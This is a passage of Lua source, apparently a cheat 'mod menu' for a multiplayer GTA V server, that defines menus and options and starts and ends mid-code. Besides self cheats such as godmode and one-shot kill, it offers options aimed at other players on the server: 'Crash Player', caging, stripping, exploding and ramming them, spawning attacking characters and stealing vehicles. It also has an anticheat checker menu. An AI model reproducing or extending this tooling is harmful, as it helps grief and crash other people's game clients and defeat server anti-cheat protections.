                    result = function(c0)
                        b.SetSwimMultiplierForPlayer(b.PlayerId(), c0.result)
                    end
                }, {data = {title = 'Godmode Types'}, func = 'Separator'}, {
                    data = {title = 'Godmode', value = 'GodMode'},
                    func = 'CheckBox',
                    result = c.func.C_GodMode
                }, {
                    data = {title = 'Semi Godmode', value = 'SemiGodMode'},
                    func = 'CheckBox',
                    result = c.func.C_SemiGodMode
                }
            }
        },
        ['Self_PedChanger'] = {
            parent = 'Self',
            subTitle = 'Change Peds',
            currentOption = 1,
            options = {},
            func = function()
                b.DrawRect(c.fram.var.x + c.fram.var.g_w / 2 + 0.037,
                           c.fram.var.y + 0.15, 0.0689, 0.31445,
                           c.var.colors['menu:header'][1],
                           c.var.colors['menu:header'][2],
                           c.var.colors['menu:header'][3],
                           c.fram.var.colors.menuAlpha)
                b.DrawSprite(c.fram.var.txdicts.self_pedchanger,
                             'self_pedchanger',
                             c.fram.var.x + c.fram.var.g_w / 2 + 0.037,
                             c.fram.var.y + 0.15, 0.067185, 0.31245, 0.0, 255,
                             255, 255, c.fram.var.colors.menuAlpha)
            end
        },
        ['Self_WardobeMaker'] = {
            parent = 'Self',
            subTitle = 'Wardobe Maker',
            currentOption = 1,
            options = {}
        },
        ['Self_Animations'] = {
            parent = 'Self',
            subTitle = 'Animations',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Stop', description = 'Stop any animation'},
                    func = 'Button',
                    result = c.func.B_StopAnimation
                }
            }
        },
        ['Self_ForceField'] = {
            parent = 'Self',
            subTitle = 'Force Field Options',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Force field', value = 'forcefield:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Forcefield
                }, {
                    data = {
                        title = 'Radius',
                        value = 'forcefield:radius',
                        labels = c.fram.func.NumberTableGenner(1, 50, 1)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.ForceFieldData.radius = c0.index + 0.01
                    end
                }, {
                    data = {
                        title = 'Strength',
                        value = 'forcefield:strength',
                        labels = c.fram.func.NumberTableGenner(1, 500, 1)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.ForceFieldData.strength = 200.0 - c0.index
                    end
                }, {
                    data = {
                        title = 'Show radius',
                        value = 'forcefield:radius:toggle'
                    },
                    func = 'CheckBox'
                }
            }
        },
        ['Self_SuperPowers'] = {
            parent = 'Self',
            subTitle = 'Become a comic hero',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Magneto',
                        value = 'Magneto',
                        description = 'Magneto from X-Men'
                    },
                    func = 'CheckBox',
                    result = c.func.C_Magneto
                }, {
                    data = {
                        title = 'Black Holer',
                        value = 'BlackHoler',
                        description = 'Black holer'
                    },
                    func = 'CheckBox',
                    result = c.func.C_BlackHoler
                }, {
                    data = {
                        title = 'Hulk',
                        value = 'Hulk',
                        description = 'Hulk from Marvel'
                    },
                    func = 'CheckBox',
                    result = c.func.C_Hulk
                }, {
                    data = {title = 'Force Field', subMenu = 'Self_ForceField'},
                    func = 'MenuButton'
                }
            }
        },
        ['Self_StatsEditor'] = {
            parent = 'Self',
            subTitle = 'Modify your player stats',
            currentOption = 1,
            options = {}
        },
        ['OnlinePlayers'] = {
            parent = 'MainMenu',
            subTitle = 'Players List',
            currentOption = 1,
            func = function()
                if c.fram.var.timers.currTime -
                    c.fram.var.timers.onlineplayers.time >=
                    c.fram.var.timers.onlineplayers.delay then
                    c.fram.var.timers.onlineplayers.time = c.fram.var.timers
                                                               .currTime;
                    c.fram.menus.OnlinePlayers.options = {}
                    for k, eB in c._ipairs(b.GetActivePlayers()) do
                        c.fram.menus.OnlinePlayers.options[#c.fram.menus
                            .OnlinePlayers.options + 1] = {
                            data = {
                                title = '[' .. b.GetPlayerServerId(eB) .. '] ' ..
                                    b.GetPlayerName(eB),
                                subMenu = 'OnlinePlayersOptions'
                            },
                            func = 'MenuButton',
                            result = function()
                                c.var.data.selectedPlayer = {
                                    lid = eB,
                                    sid = b.GetPlayerServerId(eB),
                                    ped = b.GetPlayerPed(eB)
                                }
                                c.fram.menus.OnlinePlayersOptions.subTitle =
                                    b.GetPlayerServerId(eB) .. ' - ' ..
                                        b.GetPlayerName(eB)
                            end
                        }
                    end
                end
            end,
            options = {}
        },
        ['OnlinePlayersOptions'] = {
            parent = 'OnlinePlayers',
            subTitle = 'Specified player options',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Spectate Player', value = 'Spectate'},
                    func = 'CheckBox',
                    result = c.func.C_Spectate
                }, {
                    data = {
                        title = 'Basics',
                        value = 'onlineplayers:basics',
                        labels = {'Teleport To', 'Steal Outfit', 'Clone Ped'},
                        results = c.func.OnlinePlayersBasics
                    },
                    func = 'ComboBox',
                    result = function(c0) c0.result() end
                }, {data = {title = 'Vehicle Rain'}, func = 'Separator'}, {
                    data = {
                        title = 'Model',
                        value = 'onlineplayers:rainmodel',
                        labels = {
                            'adder', 'taxi', 'jet', 'divo', 'bf400', 'guardian',
                            'dump', 'rhino', 'sanchez', 'sultan', 'elegy',
                            'khanjali', 'mule', 'phantom', 'hauler', 'custom'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if c0.label == 'custom' then
                            local cb = c.func.KeyboardInput('Model', '', 15)
                            local n = b.GetHashKey(cb)
                            if b.IsModelValid(n) then
                                c.var.data.RainVehicles.Model = n
                            end
                        else
                            c.var.data.RainVehicles.Model = b.GetHashKey(
                                                                c0.label)
                        end
                    end
                }, {
                    data = {
                        title = 'Vehicles Amount',
                        value = 'onlineplayers:rainvehiclesamount',
                        labels = c.fram.func.NumberTableGenner(1, 60, 1, true)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.RainVehicles.Times = c0.index
                    end
                }, {
                    data = {
                        title = 'Delay',
                        value = 'onlineplayers:rainvehiclesdelay',
                        labels = c.fram.func.NumberTableGenner(250, 10000, 250,
                                                               true)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.RainVehicles.Delay = c._tonumber(c0.label)
                    end
                }, {
                    data = {title = 'Spawn Vehicles'},
                    func = 'Button',
                    result = function()
                        c.func.B_RainVehicles()
                    end
                }, {data = {title = 'Baldies Attack'}, func = 'Separator'}, {
                    data = {
                        title = 'Weapon',
                        value = 'onlineplayers:baldiesweapon',
                        labels = c.var.data.AllWeapons
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.BaldiesAttack.Weapon = c0.label
                    end
                }, {
                    data = {
                        title = 'Delay',
                        value = 'onlineplayers:baldiesdelay',
                        labels = c.fram.func.NumberTableGenner(250, 10000, 250,
                                                               true)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.BaldiesAttack.Delay = c._tonumber(c0.label)
                    end
                }, {
                    data = {
                        title = 'Baldies Amount',
                        value = 'onlineplayers:baldiestimes',
                        labels = c.fram.func.NumberTableGenner(1, 60, 1, true)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.BaldiesAttack.Times = c0.index
                    end
                }, {
                    data = {title = 'Send Baldies'},
                    func = 'Button',
                    result = function()
                        c.func.B_BaldiesAttack()
                    end
                }, {data = {title = 'Troll Options'}, func = 'Separator'}, {
                    data = {title = 'Crash Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_Crash(c.var.data.selectedPlayer.lid)
                    end
                }, {
                    data = {title = 'Cage Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_CagePlayer(c.var.data.selectedPlayer.lid)
                    end
                }, {
                    data = {title = 'Strip Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_StripPlayer(c.var.data.selectedPlayer.lid)
                    end
                }, {
                    data = {title = 'Flashbang Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_FlashBangPlayer(c.var.data.selectedPlayer.lid)
                    end
                }, {
                    data = {title = 'Invisible Bus'},
                    func = 'Button',
                    result = function()
                        c.func.B_InivisbleBus(c.var.data.selectedPlayer.lid)
                    end
                }, {
                    data = {title = 'Taze Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_TazePlayer({c.var.data.selectedPlayer.lid})
                    end
                }, {
                    data = {title = 'Shoot Player'},
                    func = 'Button',
                    result = function()
                        c.func
                            .B_ShootAllPlayers({c.var.data.selectedPlayer.lid})
                    end
                }, {
                    data = {title = 'Explode Player'},
                    func = 'Button',
                    result = function()
                        c.func.B_ExplodePlayers({c.var.data.selectedPlayer.lid})
                    end
                }, {
                    data = {title = 'Spam Random Vehicle'},
                    func = 'Button',
                    result = function()
                        c.func.B_SpamRandomVehicles({
                            c.var.data.selectedPlayer.lid
                        })
                    end
                }, {
                    data = {
                        title = 'Attach Prop',
                        value = 'onlineplayers:attachprop',
                        labels = c.var.data.Props[1],
                        results = c.var.data.Props[2]
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_AttachProps({c.var.data.selectedPlayer.lid},
                                             c0.result)
                    end
                }, {
                    data = {
                        title = 'Flag Player',
                        value = 'onlineplayers:flag',
                        labels = c.var.data.Flags.labels,
                        results = c.var.data.Flags.data
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_FlagPlayers({c.var.data.selectedPlayer.lid},
                                             c0.result)
                    end
                }, {
                    data = {
                        title = 'Particle Player',
                        value = 'onlineplayers:particles',
                        labels = {'Single part', 'Multiple Part'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.OnlinePlayersParticles[c0.index]({
                            c.var.data.selectedPlayer.lid
                        })
                    end
                }, {
                    data = {
                        title = 'Ram Player',
                        value = 'onlineplayers:ram',
                        labels = {
                            'sultan', 'mule', 'zion2', 'felon', 'flatbeld',
                            'sentinel', 'sentinel2', 'jackal', 'cogcabrio',
                            'weevil', 'issi', 'blista', 'bus'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_RamPlayers({c.var.data.selectedPlayer.lid},
                                            c0.label)
                    end
                }, {
                    data = {
                        title = 'Weapon Options',
                        value = 'onlineplayers:weapons',
                        labels = {'Give All', 'Remove All', 'Custom'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.OnlinePlayersWeapons[c0.index]({
                            c.var.data.selectedPlayer.lid
                        })
                    end
                }
            }
        },
        ['Misc'] = {
            parent = 'MainMenu',
            subTitle = 'Misc Options',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Checker Results',
                        subMenu = 'MiscAnticheatChecker',
                        description = 'AC Checker results'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Vehicle Options',
                        subMenu = 'MiscVehicleBrowser',
                        description = 'Control vehicles'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'PTFX',
                        subMenu = 'MiscParticles',
                        description = 'Particles related'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Craft Laboratory',
                        subMenu = 'MiscCraft',
                        description = 'Craft laboratory main menu'
                    },
                    func = 'MenuButton'
                }
            }
        },
        ['MiscAnticheatChecker'] = {
            parent = 'Misc',
            subTitle = 'Checker Results',
            currentOption = 1,
            options = {}
        },
        ['MiscVehicleBrowser'] = {
            parent = 'Misc',
            subTitle = 'Vehicles List',
            currentOption = 1,
            options = {},
            func = function()
                if c.fram.var.timers.currTime -
                    c.fram.var.timers.vehiclebrowser.time >=
                    c.fram.var.timers.vehiclebrowser.delay then
                    c.fram.var.timers.vehiclebrowser.time = c.fram.var.timers
                                                                .currTime;
                    c.fram.menus.MiscVehicleBrowser.options = {}
                    for k in c.func.EnumerateVehicles() do
                        c.fram.menus.MiscVehicleBrowser.options[#c.fram.menus
                            .MiscVehicleBrowser.options + 1] = {
                            data = {
                                title = b.GetDisplayNameFromVehicleModel(
                                    b.GetEntityModel(k)) .. ' | ' ..
                                    b.GetVehicleNumberPlateText(k),
                                subMenu = 'MiscVehicleBrowserSelected'
                            },
                            func = 'MenuButton',
                            result = function()
                                c.var.data.selectedVehicle = {
                                    k, b.GetVehicleNumberPlateText(k)
                                }
                            end
                        }
                    end
                end
            end
        },
        ['MiscVehicleBrowserSelected'] = {
            parent = 'MiscVehicleBrowser',
            subTitle = 'Selected Vehicle',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Teleport To'},
                    func = 'Button',
                    result = function()
                        b.SetPedCoordsKeepVehicle(b.PlayerPedId(),
                                                  b.GetEntityCoords(
                                                      c.var.data.selectedVehicle[1]))
                    end
                }, {
                    data = {title = 'Teleport To Me'},
                    func = 'Button',
                    result = function()
                        b.SetEntityCoords(c.var.data.selectedVehicle[1],
                                          b.GetEntityCoords(b.PlayerPedId()))
                    end
                }, {
                    data = {title = 'Explode'},
                    func = 'Button',
                    result = function()
                        b.AddExplosion(b.GetEntityCoords(c.var.data
                                                             .selectedVehicle[1]),
                                       54, 1000000.0, true, false, 1.0)
                    end
                }, {
                    data = {title = 'Delete'},
                    func = 'Button',
                    result = function()
                        b.DeleteEntity(c.var.data.selectedVehicle[1])
                    end
                }
            }
        },
        ['MiscParticles'] = {
            parent = 'Misc',
            subTitle = 'Particle Options',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Networked Particles',
                        value = 'particles:network'
                    },
                    func = 'CheckBox'
                }, {
                    data = {title = 'Loop Particles', value = 'particles'},
                    func = 'CheckBox',
                    result = c.func.C_LoopParticles
                }, {
                    data = {
                        title = 'Scale',
                        value = 'particles:scale',
                        labels = c.fram.func.NumberTableGenner(1, 100, 0.5)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.selectedParticleScale = c._tonumber(c0.label)
                    end
                }, {
                    data = {
                        title = 'Time',
                        value = 'particles:timing',
                        labels = c.fram.func.NumberTableGenner(50, 2500, 50)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.selectedParticleTime = c._tonumber(c0.label)
                    end
                }
            }
        },
        ['MiscCraft'] = {
            parent = 'Misc',
            subTitle = 'Craft Laboratory',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Maps',
                        subMenu = 'MiscCraftMaps',
                        description = 'Custom map spawner'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Vehicles',
                        subMenu = 'MiscCraftVehicles',
                        description = 'Custom vehicle spawner'
                    },
                    func = 'MenuButton'
                }, {
                    data = {title = 'Freecam', value = 'miscraft:freecam'},
                    func = 'CheckBox',
                    result = c.func.C_Freecam
                }
            }
        },
        ['MiscCraftMaps'] = {
            parent = 'MiscCraft',
            subTitle = 'Maps',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Teleport To Map', value = 'craft:mapstp'},
                    func = 'CheckBox'
                }
            }
        },
        ['MiscCraftVehicles'] = {
            parent = 'MiscCraft',
            subTitle = 'Vehicles',
            currentOption = 1,
            options = {}
        },
        ['Vehicle'] = {
            parent = 'MainMenu',
            subTitle = 'Vehicle related options',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Vehicle Spawner',
                        subMenu = 'VehicleSpawner',
                        description = 'Spawn game vehicles'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Vehicle Customs',
                        subMenu = 'VehicleLSCMain',
                        description = 'Customize your vehicles'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Handling Manager',
                        subMenu = 'VehicleHandlingModifier',
                        description = 'Changing gravity who?'
                    },
                    func = 'MenuButton'
                }, {data = {title = 'Basics'}, func = 'Separator'},
                {
                    data = {title = 'Repair'},
                    func = 'Button',
                    result = c.func.B_Repair
                }, {
                    data = {title = 'Repair Engine'},
                    func = 'Button',
                    result = c.func.B_RepairEngine
                }, {
                    data = {title = 'Flip Vehicle'},
                    func = 'Button',
                    result = c.func.B_FlipVehicle
                }, {
                    data = {title = 'Delete Vehicle'},
                    func = 'Button',
                    result = c.func.B_DeleteSelfVehicle
                }, {data = {title = 'AI'}, func = 'Separator'}, {
                    data = {title = 'Drive to waypoint'},
                    func = 'Button',
                    result = c.func.B_AutoPilot_Start
                }, {
                    data = {title = 'Drive Randomly'},
                    func = 'Button',
                    result = c.func.B_AutoPilot_DriveRandomly
                }, {
                    data = {title = 'Stop Inmediatly'},
                    func = 'Button',
                    result = c.func.B_AutoPilot_StopInmediatly
                }, {
                    data = {
                        title = 'Style',
                        labels = {
                            'Normal', 'Ignore Lights', 'Avoid Traffic Extremely'
                        },
                        value = 'vehicle:autopilot:style',
                        results = {786603, 2883621, 6}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.AutoPilot.Style = c0.result
                    end
                }, {data = {title = 'Others'}, func = 'Separator'}, {
                    data = {title = 'Steal Vehicle', subTitle = 'Trigger'},
                    func = 'Button',
                    result = c.func.B_SetOwnedVehicle
                }, {
                    data = {title = 'Change plate'},
                    func = 'Button',
                    result = c.func.B_ChangePlate
                }, {
                    data = {title = 'Godmode', value = 'vehicle:godmode'},
                    func = 'CheckBox',
                    result = c.func.C_VehicleGodMode
                }, {
                    data = {title = 'Drift Mode', value = 'vehicle:driftmode'},
                    func = 'CheckBox',
                    result = c.func.C_DriftMode
                }, {
                    data = {title = 'Horn Boost', value = 'vehicle:hornboost'},
                    func = 'CheckBox',
                    result = c.func.C_HornBoost
                }, {
                    data = {title = 'Bunny Jump', value = 'vehicle:bunnyjump'},
                    func = 'CheckBox',
                    result = c.func.C_BunnyJump
                }, {
                    data = {
                        title = 'Torque Multiplier',
                        value = 'vehicle:torque',
                        labels = {
                            'DFT', 'x1.5', 'x2', 'x3', 'x5', 'x10', 'x20',
                            'x50', 'x100', 'x500', 'x1000', 'x2500', 'x5000'
                        },
                        results = {
                            1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0,
                            500.0, 1000.0, 2500.0, 5000.0
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if b.IsPedInAnyVehicle(b.PlayerPedId(), false) then
                            b.SetVehicleEnginePowerMultiplier(
                                b.GetVehiclePedIsIn(b.PlayerPedId()), c0.result)
                        end
                    end
                }
            }
        },
        ['VehicleHandlingModifier'] = {
            parent = 'Vehicle',
            subTitle = 'Premade handlings who?',
            currentOption = 1,
            options = {},
            func = function()
                local Q = b.PlayerPedId()
                if b.IsPedInAnyVehicle(Q, false) and
                    b.GetVehiclePedIsIn(Q, false) ~= c.var.data.HandlingVehicle then
                    c.fram.menus.VehicleHandlingModifier.options = {}
                    c.var.data.HandlingVehicle = b.GetVehiclePedIsIn(Q, false)
                    for k, eB in c._ipairs(
                                     c.func.CollectHandlingData(
                                         b.GetVehiclePedIsIn(Q, false))) do
                        c._table.insert(c.fram.menus.VehicleHandlingModifier
                                            .options, {
                            data = {title = eB[3], subTitle = eB[1]},
                            func = 'Button',
                            result = function()
                                local c1 =
                                    c.func.KeyboardInput(eB[3], eB[1], 20, true)
                                if c1 then
                                    c.func.SetHandlingData(c.var.data
                                                               .HandlingVehicle,
                                                           eB[3], c1)
                                    c.var.data.HandlingVehicle = 0
                                else
                                    c.fram.func.Notify('error', 'Invalid value')
                                end
                            end
                        })
                    end
                end
            end
        },
        ['VehicleSpawner'] = {
            parent = 'Vehicle',
            subTitle = 'Vehicle Spawner',
            currentOption = 1,
            func = function()
                if c.fram.menus.VehicleSpawner.currentOption > 5 then
                    b.DrawSprite(c.fram.var.txdicts.veh_nextsprite,
                                 'veh_nextsprite',
                                 c.fram.var.x + c.fram.var.g_w * 0.75,
                                 c.fram.var.y + c.fram.var.header_h / 2, 0.09,
                                 0.08, 0.0, 255, 255, 255,
                                 c.fram.var.colors.menuAlpha)
                end
            end,
            options = {
                {
                    data = {
                        title = 'Full Performance',
                        value = 'vehiclespawner:spawnfullperformace'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Full Tunning',
                        value = 'vehiclespawner:spawnfulltunning'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Spawn In',
                        value = 'vehiclespawner:spawnin'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Categories'}, func = 'Separator'}, {
                    data = {title = 'Input Model'},
                    func = 'Button',
                    result = function()
                        local cb = c.func.KeyboardInput('Model', '', 20, false)
                        c.func.CreateParametedVehicle(cb)
                    end
                }, {
                    data = {
                        title = 'Add-on',
                        value = 'vehspawner:addon',
                        labels = c.var.data.AddonVehicles.saved
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.CreateParametedVehicle(c0.label)
                    end
                }
            }
        },
        ['VehicleLSCMain'] = {
            parent = 'Vehicle',
            subTitle = 'LSC main page',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Stethic',
                        subMenu = 'LSCStetic',
                        description = 'Change vehicle exterior'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Performance',
                        subMenu = 'LSCPerformance',
                        description = 'Change vehicle exterior'
                    },
                    func = 'MenuButton'
                }, {data = {title = 'Fast options'}, func = 'Separator'}, {
                    data = {title = 'Full tunning'},
                    func = 'Button',
                    result = function()
                        c.func.VehicleFullTunning(
                            b.GetVehiclePedIsIn(b.PlayerPedId(), false))
                    end
                }, {
                    data = {title = 'Full performance tunning'},
                    func = 'Button',
                    result = function()
                        c.func.VehicleFullPerformance(
                            b.GetVehiclePedIsIn(b.PlayerPedId(), false))
                    end
                }
            }
        },
        ['LSCStetic'] = {
            parent = 'VehicleLSCMain',
            subTitle = 'How can I help you today?',
            currentOption = 1,
            func = function()
                local Q = b.PlayerPedId()
                if b.IsPedInAnyVehicle(Q, false) then
                    local vehicle = b.GetVehiclePedIsIn(Q, false)
                    if c.var.data.LSC.SavedVehicle ~= vehicle then
                        c.fram.menus.LSCStetic.options = {}
                        c.var.data.LSC.SavedVehicle = vehicle;
                        b.SetVehicleModKit(vehicle, 0)
                        for k, eB in c._pairs(c.var.data.LSC.ModList) do
                            local ie = b.GetNumVehicleMods(vehicle, eB)
                            if ie > 0 then
                                local ig = {}
                                for ev = 1, ie do
                                    local ih =
                                        b.GetLabelText(b.GetModTextLabel(
                                                           vehicle, eB, ev)) or
                                            'NULL'
                                    ig[#ig + 1] = ih == 'NULL' and 'Stock' or ih
                                end
                                c._table.insert(c.fram.menus.LSCStetic.options,
                                                {
                                    data = {
                                        title = k,
                                        value = 'lsc:stetic:' .. k,
                                        labels = ig
                                    },
                                    func = 'ComboBox',
                                    result = function(c0)
                                        b.SetVehicleMod(vehicle, eB, c0.index,
                                                        false)
                                    end
                                })
                            end
                        end
                    end
                end
            end,
            options = {}
        },
        ['LSCPerformance'] = {
            parent = 'VehicleLSCMain',
            subTitle = 'Lets boost this shit',
            currentOption = 1,
            func = function()
                local Q = b.PlayerPedId()
                if b.IsPedInAnyVehicle(Q, false) then
                    local vehicle = b.GetVehiclePedIsIn(Q, false)
                    if c.var.data.LSC.SavedVehicleP ~= vehicle then
                        c.fram.menus.LSCPerformance.options = {}
                        c.var.data.LSC.SavedVehicleP = vehicle;
                        b.SetVehicleModKit(vehicle, 0)
                        for k, eB in c._pairs(c.var.data.LSC.PerformanceModList) do
                            local ie = b.GetNumVehicleMods(vehicle, eB)
                            if ie > 0 then
                                local ig = {}
                                for ev = 1, ie do
                                    local ih =
                                        b.GetLabelText(b.GetModTextLabel(
                                                           vehicle, eB, ev)) or
                                            'NULL'
                                    ig[#ig + 1] = ih == 'NULL' and 'Stock' or ih
                                end
                                c._table.insert(
                                    c.fram.menus.LSCPerformance.options, {
                                        data = {
                                            title = k,
                                            value = 'lsc:perf:' .. k,
                                            labels = ig
                                        },
                                        func = 'ComboBox',
                                        result = function(c0)
                                            b.SetVehicleMod(vehicle, eB,
                                                            c0.index - 2, false)
                                        end
                                    })
                            end
                        end
                    end
                end
            end,
            options = {}
        },
        ['Weapon'] = {
            parent = 'MainMenu',
            subTitle = 'Weapon Options',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Weapon Spawner',
                        subMenu = 'WeaponSpawner',
                        description = 'Weapon Spawner'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Combat Assiters',
                        subMenu = 'WeaponCombat',
                        description = 'Combat Assiters'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Pokemon Go',
                        subMenu = 'WeaponPokemon',
                        description = 'Pokemon go! WOOOHOOOO'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Kits',
                        subMenu = 'PremadeKits',
                        description = 'Premade kits'
                    },
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Modifiers',
                        subMenu = 'WeaponModifiers',
                        description = 'Combat modifiers'
                    },
                    func = 'MenuButton'
                }, {data = {title = 'Others'}, func = 'Separator'}, {
                    data = {title = 'Crosshair', value = 'combat:crosshair'},
                    func = 'CheckBox',
                    result = c.func.C_Crosshair
                }, {
                    data = {
                        title = 'Damage Multiplier',
                        value = 'combat:damagemultiplier',
                        labels = {
                            'None', 'x1.5', 'x2', 'x3', 'x5', 'x25', 'x50',
                            'x100', 'x200', 'x500', 'x1000', 'x0.5'
                        },
                        results = {
                            1.0, 1.5, 2.0, 3.0, 5.0, 25.0, 50.0, 100.0, 200.0,
                            500.0, 1000.0, 0.5
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        b.SetWeaponDamageModifier(
                            b.GetSelectedPedWeapon(b.PlayerPedId()), c0.result)
                    end
                }, {
                    data = {title = 'Infinite Ammo', value = 'infiniteammo'},
                    func = 'CheckBox',
                    result = c.func.C_InfiniteAmmo
                }, {
                    data = {
                        title = 'One Shot Kill',
                        value = 'combat:oneshotkill'
                    },
                    func = 'CheckBox',
                    result = c.func.C_OneShotKill
                }, {
                    data = {title = 'Laser Sight', value = 'combat:lasersight'},
                    func = 'CheckBox',
                    result = c.func.C_LaserSight
                }
            }
        },
        ['WeaponPokemon'] = {
            parent = 'Weapon',
            subTitle = 'I play pokemon go...',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Pokemon Go Toggle', value = 'pokemongo'},
                    func = 'CheckBox',
                    result = c.func.C_PokemonGo
                }, {
                    data = {title = 'Network peds', value = 'pokemongo:network'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Particles',
                        value = 'pokemongo:particles',
                        description = 'Spawn particles'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Network Particles',
                        value = 'pokemongo:networkparticles',
                        description = 'Network spawn particles'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Pokemon',
                        value = 'pokemongo:peds',
                        labels = c.var.data.PokemonGo.pedList,
                        results = c.var.data.PokemonGo.pedListdata
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.PokemonGo.selectedPed = c0.result
                    end
                }
            }
        },
        ['WeaponModifiers'] = {
            parent = 'Weapon',
            subTitle = 'Weapon modifiers',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Teleport Gun', value = 'teleportgun'},
                    func = 'CheckBox',
                    result = c.func.C_TeleportGun
                }, {
                    data = {title = 'Airstrike Gun', value = 'airstrikegun'},
                    func = 'CheckBox',
                    result = c.func.C_AirstrikeGun
                }, {
                    data = {title = 'Whales Gun', value = 'whalesgun'},
                    func = 'CheckBox',
                    result = c.func.C_WhalesGun
                }, {
                    data = {title = 'Delete Gun', value = 'deletegun'},
                    func = 'CheckBox',
                    result = c.func.C_DeleteGun
                }, {
                    data = {title = 'Drive It Gun', value = 'driveitgun'},
                    func = 'CheckBox',
                    result = c.func.C_DriveItGun
                }, {
                    data = {title = 'Bring It Gun', value = 'bringitgun'},
                    func = 'CheckBox',
                    result = c.func.C_BringItGun
                }, {
                    data = {
                        title = 'Vehicle Gun',
                        value = 'weapon:shootvehicles'
                    },
                    func = 'CheckBox',
                    result = c.func.C_ShootVehicles
                }, {
                    data = {
                        title = 'Vehicle Model',
                        value = 'weapon:shootvehiclesmodel',
                        labels = {
                            'sultan', 'mule', 'zion2', 'felon', 'flatbeld',
                            'sentinel', 'sentinel2', 'jackal', 'cogcabrio',
                            'weevil', 'issi', 'blista', 'bus'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.ShootVehicles = b.GetHashKey(c0.label)
                    end
                }
            }
        },
        ['PremadeKits'] = {
            parent = 'Weapon',
            subTitle = 'Premade kits',
            currentOption = 1,
            options = {}
        },
        ['WeaponSpawner'] = {
            parent = 'Weapon',
            subTitle = 'Weapon Spawner',
            currentOption = 1,
            func = function()
                if c.fram.menus.WeaponSpawner.currentOption > 3 then
                    b.DrawSprite(c.fram.var.txdicts.wep_nextsprite,
                                 'wep_nextsprite',
                                 c.fram.var.x + c.fram.var.g_w * 0.75,
                                 c.fram.var.y + c.fram.var.header_h / 2, 0.09,
                                 0.08, 0.0, 255, 255, 255,
                                 c.fram.var.colors.menuAlpha)
                end
            end,
            options = {
                {
                    data = {
                        title = 'Spawn with 250 bullets',
                        value = 'weaponspawner:fullbullets'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Equip Instantly',
                        value = 'weaponspawner:equiponspawn'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Categories'}, func = 'Separator'}
            }
        },
        ['WeaponCombat'] = {
            parent = 'Weapon',
            subTitle = 'Combat assistance',
            currentOption = 1,
            func = function()
                b.DrawRect(c.fram.var.x + c.fram.var.g_w / 2 + 0.037,
                           c.fram.var.y + 0.15, 0.0689, 0.31445,
                           c.var.colors['menu:header'][1],
                           c.var.colors['menu:header'][2],
                           c.var.colors['menu:header'][3],
                           c.fram.var.colors.menuAlpha)
                b.DrawSprite(c.fram.var.txdicts.wep_ped, 'wep_ped',
                             c.fram.var.x + c.fram.var.g_w / 2 + 0.037,
                             c.fram.var.y + 0.15, 0.067185, 0.31245, 0.0, 255,
                             255, 255, c.fram.var.colors.menuAlpha)
                b.DrawSprite('srange_gen', 'hit_cross',
                             c.fram.var.x + c.fram.var.g_w / 2 + 0.037 +
